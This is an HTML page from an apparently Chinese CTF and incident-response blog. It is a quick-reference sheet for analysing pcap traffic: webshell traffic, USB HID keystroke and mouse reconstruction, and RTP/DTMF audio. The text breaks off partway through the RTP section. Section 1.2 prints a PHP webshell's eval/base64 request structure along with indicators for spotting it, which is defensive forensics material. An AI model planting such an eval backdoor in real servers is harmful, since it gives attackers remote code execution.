@@ -1,0 +1,1353 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>流量分析-按种类速查 · pressure-J</title>
+<meta name="description" content="&gt; 定位：CTF Misc / 应急响应流量题的按类型查表文档。看到什么流量，翻到对应一节。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/liu-liang-fen-xi-an-zhong-lei-su-cha.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="流量分析-按种类速查 · pressure-J">
+<meta property="og:description" content="&gt; 定位：CTF Misc / 应急响应流量题的按类型查表文档。看到什么流量，翻到对应一节。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/misc.html">Misc</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>流量分析-按种类速查</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-misc">Misc</span>
+          <time datetime="2026-10-09">2026-10-09</time>
+          <span>17712 字</span>
+          <span>约 47 分钟</span>
+        </div>
+        <div class="chips post-tags"><span class="chip">misc</span><span class="chip">流量分析</span><span class="chip">pcap</span><span class="chip">速查</span></div>
+      </header>
+      <div class="content"><blockquote>
+<p><strong>定位</strong>：CTF Misc / 应急响应流量题的<strong>按类型查表</strong>文档。看到什么流量，翻到对应一节。<br />
+<strong>不重复的内容</strong>：Wireshark 界面用法、过滤器语法、tshark 参数、常见端口表 —— 见同库 <code>baseknown\Wireshark使用与流量包分析基础.md</code>。<br />
+<strong>脚本位置</strong>：<code>~/tools\CTF工具箱\misc\</code>（HTTP/webshell、USB 键鼠、文件分离、密码爆破），改顶部一行即换题。<br />
+<strong>本机 tshark</strong>：<code>~/tools\Wireshark\tshark.exe</code>（4.6.0，未入 PATH，用全路径）。</p>
+</blockquote>
+<hr />
+<h2 id="_1">〇、进场四步（任何流量题都先走一遍）</h2>
+<h3 id="01">0.1 协议分级 —— 定方向</h3>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 哪个协议占大头，方向就在哪</span>
+~/tools<span class="se">\W</span>ireshark<span class="se">\t</span>shark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-q<span class="w"> </span>-z<span class="w"> </span>io,phs
+</code></pre></div></div>
+
+<p>图形界面：<code>Statistics → Protocol Hierarchy</code>。</p>
+<h3 id="02">0.2 搜关键字 —— 碰运气</h3>
+<p><code>Ctrl+F</code> → 选 <strong>String</strong> 或 <strong>Packet bytes</strong> → 搜 <code>flag</code>、<code>{</code>、<code>key</code>、<code>pass</code>。</p>
+<h3 id="03">0.3 数流 —— 看有多少条会话</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-q<span class="w"> </span>-z<span class="w"> </span>conv,tcp<span class="w">    </span><span class="c1"># TCP 会话列表，一条一行</span>
+</code></pre></div></div>
+
+<p>会话数少（1~3 条）→ 慢慢 Follow；几十上百条 → 先找"最不像正常业务"的那条。</p>
+<h3 id="04">0.4 分清"包"和"流"</h3>
+<p><strong>一行是一个包，一条流可能是几十上百个包。</strong> 看到一堆小包先 Follow 拼回来，别逐个看。</p>
+<h3 id="05">0.5 魔数验真类型 —— 导出文件第一件事</h3>
+<p>扩展名随便改，文件头骗不了人：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>文件头(hex)</th>
+<th>真实类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>FF D8 FF E0/E1</code></td>
+<td>JPEG</td>
+<td>图片</td>
+</tr>
+<tr>
+<td><code>89 50 4E 47</code></td>
+<td>PNG</td>
+<td>图片</td>
+</tr>
+<tr>
+<td><code>47 49 46 38</code></td>
+<td>GIF</td>
+<td>动图</td>
+</tr>
+<tr>
+<td><code>50 4B 03 04</code></td>
+<td>ZIP（含 docx/xlsx/apk/jar）</td>
+<td>压缩包</td>
+</tr>
+<tr>
+<td><code>52 61 72 21</code></td>
+<td>RAR</td>
+<td>压缩包</td>
+</tr>
+<tr>
+<td><code>37 7A BC AF</code></td>
+<td>7z</td>
+<td>压缩包</td>
+</tr>
+<tr>
+<td><code>25 50 44 46</code></td>
+<td>PDF</td>
+<td>文档</td>
+</tr>
+<tr>
+<td><code>7F 45 4C 46</code></td>
+<td>ELF</td>
+<td>Linux 可执行</td>
+</tr>
+<tr>
+<td><code>4D 5A</code></td>
+<td>PE/EXE</td>
+<td>Windows 可执行</td>
+</tr>
+<tr>
+<td><code>3C 3F 70 68 70</code>（<code>&lt;?php</code>）</td>
+<td>真 PHP</td>
+<td>源码/木马</td>
+</tr>
+<tr>
+<td>全是 <code>A-Za-z0-9+/=</code></td>
+<td><strong>base64 文本</strong></td>
+<td>先解码再判类型</td>
+</tr>
+<tr>
+<td>全是 <code>0123456789abcdef</code></td>
+<td>hex 文本</td>
+<td>先 hex 解码</td>
+</tr>
+<tr>
+<td><code>%xx%xx</code></td>
+<td>URL 编码</td>
+<td>先 URL 解码</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>核心套路：导出的文件常是「<strong>伪装 + 编码</strong>」双层。文件名说是 <code>x.php</code>，实际可能是 base64 的 JPEG。</p>
+</blockquote>
+<hr />
+<h2 id="http-web">一、HTTP / Web 明文流量</h2>
+<p><strong>识别</strong>：<code>http</code> 过滤器有内容；或协议分级里 <code>http</code> 占大头。</p>
+<h3 id="11-http">1.1 普通 HTTP</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>看什么</th>
+<th>怎么找</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>请求参数 / 响应体</td>
+<td>右键 → <strong>Follow → TCP Stream</strong></td>
+</tr>
+<tr>
+<td>Cookie（常藏数据）</td>
+<td>过滤 <code>http.cookie</code> 或看 <code>Set-Cookie</code></td>
+</tr>
+<tr>
+<td>上传/下载的文件</td>
+<td><strong>File → Export Objects → HTTP</strong>，一键导出</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Cookie 可疑特征</strong>：<code>exam_currentuser</code>、<code>PHPSESSID</code> 等值超长 → 可能是被多次 URL 编码的数据（<code>%25XX</code> 要解多层）。</p>
+<h3 id="12-armitage">1.2 一句话木马（明文型：蚁剑 Armitage / 中国菜刀）</h3>
+<p><strong>识别特征</strong>（在 Follow 流里看到这些）：</p>
+<ul>
+<li><code>POST</code> 到某个 <code>.php</code>，body 里有 <code>action=</code>、<code>z0</code>~<code>z3</code> 这类字段</li>
+<li>或大量 <code>@ini_set</code>、<code>@set_time_limit</code>、<code>@set_magic_quotes_runtime</code>、<code>open_basedir</code>、<code>chdir</code>、<code>posix_getegid</code>、<code>base64_decode($_POST[...])</code></li>
+<li><code>User-Agent: Java/1.8.0_151</code>（蚁剑默认）</li>
+<li>响应被 <code>-&gt;|</code> 和 <code>|&lt;-</code> 包裹</li>
+</ul>
+<p><strong>请求结构</strong>：</p>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>aa=@eval(base64_decode($_POST[action]));     ← 固定外壳
+&amp;action=&lt;base64: 木马功能代码&gt;
+&amp;z1=&lt;base64: 操作参数(通常是被操作的文件路径)&gt;
+&amp;z2=&lt;hex:  真正要上传/写入的数据&gt;          ← 超长的那串
+</code></pre></div></div>
+
+<p><strong>回显结构</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>-&gt;| 实际输出内容 |&lt;-
+</code></pre></div></div>
+
+<p><strong>解码三步</strong>（手工在 Wireshark 里干会很痛苦）：</p>
+<ol>
+<li><code>action</code> → base64 解码 → 得到 PHP 代码，看它在干什么（列目录 / 读文件 / 写文件）</li>
+<li><code>z1</code> → base64 解码 → 得到目标路径</li>
+<li><code>z2</code> → 是<strong>纯 hex 字符串</strong> → <code>bytes.fromhex()</code> → 得到真正写入的文件</li>
+</ol>
+<blockquote>
+<p><strong>z2 那串几十万字符千万别手工复制</strong>——那正是"不好复制"的部分，用脚本。</p>
+</blockquote>
+<p><strong>看 <code>action</code> 代码就能判断动作类型</strong>：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>代码里的关键字</th>
+<th>动作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>opendir</code> + <code>readdir</code></td>
+<td>列目录</td>
+</tr>
+<tr>
+<td><code>fopen($F,"r")</code> + <code>fread</code></td>
+<td>读文件</td>
+</tr>
+<tr>
+<td><code>fopen($f,"w")</code> + <code>fwrite</code></td>
+<td><strong>写文件（上传）</strong></td>
+</tr>
+<tr>
+<td><code>posix_getegid</code> / <code>php_uname</code></td>
+<td>基本信息（看当前目录、系统、权限）</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="13-behinder-godzilla">1.3 加密木马（冰蝎 Behinder / 哥斯拉 Godzilla）</h3>
+<p><strong>和 1.2 的区别</strong>：蚁剑/菜刀是 <strong>base64 明文</strong>，冰蝎/哥斯拉是 <strong>AES 加密的字节流</strong>。</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th>蚁剑 / 菜刀</th>
+<th>冰蝎</th>
+<th>哥斯拉</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>请求体长相</td>
+<td>表单 <code>action=&amp;z1=&amp;z2=</code> + base64</td>
+<td>一坨<strong>乱码字节</strong>，Content-Type 常是 <code>application/octet-stream</code></td>
+<td>一坨乱码，参数名固定为 <code>pass=</code></td>
+</tr>
+<tr>
+<td>解密方式</td>
+<td>base64 / hex 直接解</td>
+<td>AES，key = md5(密码) 前 16 字节</td>
+<td>AES 或 XOR，密钥由 payload 里的 key 派生</td>
+</tr>
+<tr>
+<td>怎么认</td>
+<td>一眼看出</td>
+<td>请求/响应等长、不可读</td>
+<td>同左</td>
+</tr>
+<tr>
+<td>解密前提</td>
+<td>无</td>
+<td>需要<strong>密码</strong>（题目一般会给，或在 webshell 源码里）</td>
+<td>需要从服务端脚本里抠出 key</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>处理流程</strong>：先导出木马文件本身（<code>Export Objects</code>）→ 读源码拿密码/密钥 → 写脚本把每个请求体 base64 解一层 → AES 解密 → 前 2 字节是 <code>1f 8b</code> 则 gzip 解压 → 得到明文命令。</p>
+<blockquote>
+<p>典型实战见 <code>应急响应杂项\03-流量分析\Webshell上传与加密隧道分析WriteUp.md</code>（XOR + Base64 + gzip 三层，密钥 <code>3c6e0b8a9c15224a</code>）。</p>
+</blockquote>
+<h3 id="14">1.4 加密隧道（无回显特征）</h3>
+<p>木马把命令执行结果通过一个<strong>独立程序</strong>（<code>back.exe</code> 之类）回传时，表现为：请求/响应都是<strong>等长 1460 字节</strong>（TCP MSS 满包）的不可读数据。</p>
+<p><strong>识别</strong>：TCP 会话列表里出现两方持续互传 1400+ 字节的流，且没有任何 HTTP 可读内容。<br />
+<strong>处理</strong>：抓不到密钥就到此为止——转去分析<strong>同一台机器上更早的明文流量</strong>（命令是怎么下发的）。</p>
+<h3 id="15">1.5 代理 / 一个字符一个包</h3>
+<p><strong>识别</strong>：常见代理端口 <code>7890</code>、<code>1080</code>；每个包只带 1 字节；会话数极少。<br />
+<strong>处理</strong>：Follow 那条流 → 拼回完整文本即可。</p>
+<h3 id="16-http-export-objects">1.6 HTTP 文件外带（Export Objects）</h3>
+<p>菜单 <strong>File → Export Objects → HTTP</strong>，把列表里所有对象导出来，然后按 0.5 节验真类型。</p>
+<p>同理还有 <strong>SMB / TFTP / FTP-DATA / DICOM</strong> 各自的 Export Objects 入口，按协议分级的结果选。</p>
+<hr />
+<h2 id="usb-hid">二、USB HID 流量（超高频考点）</h2>
+<blockquote>
+<p>主流常考题型，不是偏题。固定套路：<strong>找设备 → 抽 <code>usbhid.data</code> / <code>usb.capdata</code> → 按字节布局解析 → 还原按键/轨迹。</strong></p>
+</blockquote>
+<h3 id="21">2.1 三条铁律</h3>
+<ol>
+<li><strong>先分清键盘还是鼠标</strong>：键盘 8 字节、第 3 字节是按键码；鼠标 8 字节、含 X/Y 相对位移。</li>
+<li><strong>鼠标报的是"相对位移"不是坐标</strong>：必须逐包累加；<code>按键=0</code>（抬笔）时要<strong>断开笔画</strong>，否则连出满屏长直线。</li>
+<li><strong>字节布局不统一</strong>：X/Y 在第几字节各鼠标不同，认不准就把偏移换着试。</li>
+</ol>
+<h3 id="22">2.2 找设备</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 协议分级里出现 usb 且大量 interrupt 包 → USB HID 题</span>
+tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-q<span class="w"> </span>-z<span class="w"> </span>io,phs
+</code></pre></div></div>
+
+<p>在 Wireshark 里看 <code>usb.src</code>，<strong>包最多、每包等长</strong>的那个设备就是目标。</p>
+<h3 id="23-hid">2.3 抽 HID 数据</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 新版字段 usbhid.data，老版 usb.capdata，两个都试</span>
+tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-Y<span class="w"> </span><span class="s1">'usb.src=="1.2.1"'</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>usbhid.data
+</code></pre></div></div>
+
+<p>得到一串十六进制，键盘/鼠标通常是 <strong>16 个 hex = 8 字节</strong>。</p>
+<blockquote>
+<p><strong>坑</strong>：同一份包里可能 <code>usbhid.data</code> 全空、数据只在 <code>usb.capdata</code> 里。</p>
+</blockquote>
+<h3 id="24">2.4 判字节布局</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>设备</th>
+<th>常见布局（8 字节）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>键盘</td>
+<td><code>[修饰键, 保留, 键码1, 键码2, 键码3, 键码4, 键码5, 键码6]</code></td>
+</tr>
+<tr>
+<td>鼠标(8B)</td>
+<td><code>[按键, ?, X位移, ?, Y位移, ?, 滚轮, ?]</code></td>
+</tr>
+<tr>
+<td>鼠标(4B)</td>
+<td><code>[按键, X位移, Y位移, 滚轮]</code></td>
+</tr>
+<tr>
+<td>鼠标(6B)</td>
+<td><code>[按键, X位移, Y位移, ...]</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>判断技巧</strong>：某字节只取 <code>0/255</code> 两个值 → 多半是 16 位补码的高字节（符号位）；某字节几乎恒为 0 → 填充位。</p>
+<h3 id="25">2.5 键盘</h3>
+<p><strong>键码表（常用）</strong>：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>键码</th>
+<th>字符</th>
+<th>键码</th>
+<th>字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x04–0x1D</td>
+<td>a–z</td>
+<td>0x1E–0x26</td>
+<td>1–9,0</td>
+</tr>
+<tr>
+<td>0x28</td>
+<td>Enter</td>
+<td>0x2C</td>
+<td>空格</td>
+</tr>
+<tr>
+<td>0x2D</td>
+<td><code>-</code></td>
+<td>0x2E</td>
+<td><code>=</code></td>
+</tr>
+<tr>
+<td>0x2F</td>
+<td><code>[</code></td>
+<td>0x30</td>
+<td><code>]</code></td>
+</tr>
+<tr>
+<td>0x33</td>
+<td><code>;</code></td>
+<td>0x34</td>
+<td><code>'</code></td>
+</tr>
+<tr>
+<td>0x36</td>
+<td><code>,</code></td>
+<td>0x37</td>
+<td><code>.</code></td>
+</tr>
+<tr>
+<td>0x38</td>
+<td><code>/</code></td>
+<td>0x39</td>
+<td>CapsLock</td>
+</tr>
+</tbody>
+</table></div>
+<p>修饰键位：bit0=LCtrl，bit1=LShift，bit2=LAlt，bit3=LMeta（右侧是高位）。<br />
+<strong>坑</strong>：同一个键会重复出现多个包（按住），要<strong>去重</strong>。</p>
+<p><strong>必须"回放编辑"（最容易漏的一步）</strong>：</p>
+<p>作者<strong>不是一次性敲完</strong>，末尾常有 <strong>Backspace(0x2A) 删错字、方向键(0x4F 右 / 0x50 左) 移动光标再插字</strong>。<br />
+只做"去重 + 查表拼接"会得到含错字的垃圾，必须<strong>按时间顺序模拟一个文本光标</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="n">buf</span><span class="p">,</span> <span class="n">cur</span> <span class="o">=</span> <span class="p">[],</span> <span class="mi">0</span>          <span class="c1"># buf=文本, cur=光标位置</span>
+<span class="k">for</span> <span class="n">mod</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">events</span><span class="p">:</span>     <span class="c1"># events = 去重后的 (修饰键, 键码) 序列</span>
+    <span class="k">if</span>   <span class="n">k</span> <span class="o">==</span> <span class="mh">0x2a</span><span class="p">:</span>       <span class="c1"># Backspace: 删光标前一个</span>
+        <span class="k">if</span> <span class="n">cur</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span> <span class="k">del</span> <span class="n">buf</span><span class="p">[</span><span class="n">cur</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span> <span class="n">cur</span> <span class="o">-=</span> <span class="mi">1</span>
+    <span class="k">elif</span> <span class="n">k</span> <span class="o">==</span> <span class="mh">0x50</span><span class="p">:</span>       <span class="c1"># Left</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">cur</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">k</span> <span class="o">==</span> <span class="mh">0x4f</span><span class="p">:</span>       <span class="c1"># Right</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">cur</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>                 <span class="c1"># 普通字符: 插到光标处</span>
+        <span class="n">ch</span> <span class="o">=</span> <span class="n">key_to_char</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="n">buf</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span> <span class="n">cur</span> <span class="o">+=</span> <span class="mi">1</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+</code></pre></div></div>
+
+<blockquote>
+<p><strong>判断技巧</strong>：末尾出现 <code>50 50 50...</code>（左箭头连按）+ <code>2a</code>（退格）基本就是"定位改错字"，老老实实回放，别猜。</p>
+</blockquote>
+<p><strong>现成脚本</strong>：<code>~/tools\CTF工具箱\misc\10-USB键盘流量还原文本.py</code>（自动选设备/字段，输出去重序列 + 回放编辑后文本 + 疑似 flag）</p>
+<h3 id="26">2.6 鼠标</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">s8</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>                       <span class="c1"># 补码：&gt;127 视为负数</span>
+    <span class="k">return</span> <span class="n">v</span> <span class="o">-</span> <span class="mi">256</span> <span class="k">if</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="mi">127</span> <span class="k">else</span> <span class="n">v</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">pts</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">hexlines</span><span class="p">:</span>               <span class="c1"># 每行 16 个 hex</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
+    <span class="n">x</span> <span class="o">+=</span> <span class="n">s8</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>                <span class="c1"># X 位移（第 2 字节）</span>
+    <span class="n">y</span> <span class="o">+=</span> <span class="n">s8</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>                <span class="c1"># Y 位移（第 4 字节）</span>
+    <span class="n">pts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>     <span class="c1"># b[0]=按键</span>
+
+<span class="c1"># 画图时：pressed==0 就断开笔画，别连线</span>
+</code></pre></div></div>
+
+<p><strong>现成脚本</strong>：<code>~/tools\CTF工具箱\misc\08-USB鼠标流量还原轨迹.py</code>（改 <code>PCAP/DEVICE</code> 两行，输出 <code>mouse_0~3.png</code> 四种翻转）</p>
+<p><strong>看图要点</strong>：<br />
+- <strong>Y 轴方向相反</strong>：USB 鼠标 Y 正方向常与屏幕相反 → 图上下颠倒，试翻转<br />
+- <strong>镜像</strong>：作者可能画的时候左右/上下镜像，一次输出 4 种翻转挑能看清的<br />
+- <strong>轨迹里两行字</strong>：可能是"抬笔后光标跳行"，按笔画顺序读，别按视觉上下顺序</p>
+<h3 id="27-usb">2.7 USB 其他类型</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>识别</th>
+<th>处理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>USB 存储</td>
+<td>URB_BULK 大段数据</td>
+<td>提取扇区镜像，binwalk 找文件系统</td>
+</tr>
+<tr>
+<td>触摸板/数位板</td>
+<td>与键盘同设备混发</td>
+<td>靠字节特征区分，别拿鼠标脚本硬画</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="rtp-voip">三、RTP / VOIP 音频流量</h2>
+<blockquote>
+<p>RTP（实时传输协议，RFC 3550）跑在 <strong>UDP</strong> 上，通常和 <strong>SIP 信令</strong>、<strong>RTCP 控制</strong>同时出现。<br />
+固定套路：找 RTP 流 → 看 PT 编码 → 还原音频听 / 解 RFC2833 事件包。</p>
+</blockquote>
+<h3 id="31">3.1 三条铁律</h3>
+<ol>
+<li><strong>flag 两种藏法</strong>：①真人语音念出来（Wireshark 直接播）；②DTMF 按键音（听音高 / 解 PT=101 事件包）。<strong>先看包里有没有 PT=101，有就直接读字节，不用听。</strong></li>
+<li><strong>双流别听错</strong>：一通电话是<strong>两条对称流</strong>（A→B 和 B→A，SSRC 不同）。一条可能是静音/回声，播不出东西先换另一条。</li>
+<li><strong>PT 是关键</strong>：别死磕非常规 PT 的流。</li>
+</ol>
+<h3 id="32">3.2 确认 + 找流</h3>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcap<span class="w"> </span>-q<span class="w"> </span>-z<span class="w"> </span>io,phs<span class="w">      </span><span class="c1"># 大量 UDP + rtp + sip → VOIP 题</span>
+</code></pre></div></div>
+
+<p>Wireshark 里过滤 <code>rtp || sip || rtcp</code>。SIP 信令（<code>Session Initiation Protocol</code>）里能看到通话双方、编码协商（<code>rtpmap:0 PCMU/8000</code>），偶尔直接藏提示。</p>
+<h3 id="33">3.3 流列表 → 播放（图形化主力）</h3>
+<ol>
+<li>菜单 <strong>电话(Telephony) → RTP → RTP 流列表(RTP Streams)</strong></li>
+<li>列出所有流（源/目的/SSRC/包数/PT），<strong>先选包数最多的</strong></li>
+<li>点 <strong>分析(Analyze) → 播放流(Play Streams)</strong> → 戴耳机听</li>
+</ol>
+<blockquote>
+<p>Play 出来全是噪音：检查 PT 是不是音频编码；对端流换着试；采样率确认 8000。</p>
+</blockquote>
+<h3 id="34-pt">3.4 看 PT 决定走哪条路</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>PT</th>
+<th>含义</th>
+<th>处理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>G.711 μ-law (PCMU)</td>
+<td>还原 WAV 听</td>
+</tr>
+<tr>
+<td>8</td>
+<td>G.711 a-law (PCMA)</td>
+<td>还原 WAV 听</td>
+</tr>
+<tr>
+<td>9</td>
+<td>G.722</td>
+<td>还原 WAV 听（采样 16000）</td>
+</tr>
+<tr>
+<td><strong>101</strong></td>
+<td><strong>telephone-event (RFC2833)</strong></td>
+<td><strong>直接解析 payload 首字节 = DTMF 按键</strong>，不用听</td>
+</tr>
+<tr>
+<td>96~99</td>
+<td>动态 PT（SDP 里 rtpmap 定义）</td>
+<td>看 SIP 信令里协商成了什么</td>
+</tr>
+<tr>
+<td>72/73</td>
+<td>非常规值</td>
+<td>大概率<strong>烟雾弹</strong>（零星几个包），排除</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="35-rfc2833-dtmf">3.5 RFC2833 DTMF 事件包（有就白送）</h3>
+<p>PT=101 的包 payload 是 <strong>4 字节</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>[事件编号(1B)] [E|音量|保留(1B)] [持续时间(2B, 大端)]
+</code></pre></div></div>
+
+<p><strong>事件编号表</strong>：0~9 → 按键 <code>0~9</code>，10 → <code>*</code>，11 → <code>#</code>，12~15 → <code>A~D</code>。</p>
+<p>同一个按键会连发多个包（开始+持续+End 位=1 的收尾包），<strong>按事件编号去重</strong>后连起来就是拨号序列。</p>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcap<span class="w"> </span>-Y<span class="w"> </span>rtp<span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>rtp.payload
+tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcap<span class="w"> </span>-Y<span class="w"> </span><span class="s2">"rtp.p_type==101"</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>rtp.payload<span class="w">   </span><span class="c1"># 直接看按键</span>
+</code></pre></div></div>
+
+<h3 id="36-rtp">3.6 RTP 包结构（定位字段用）</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>[0]    V(2bit)=2 | P | X | CC(4bit)     ← 版本必须是 2，不是 2 的不是 RTP
+[1]    M(1bit) | PT(7bit)               ← 载荷类型在这
+[2:4]  序列号(16bit)                     ← 排序去重
+[4:8]  时间戳(32bit)
+[8:12] SSRC(32bit)                      ← 同一媒体流唯一标识
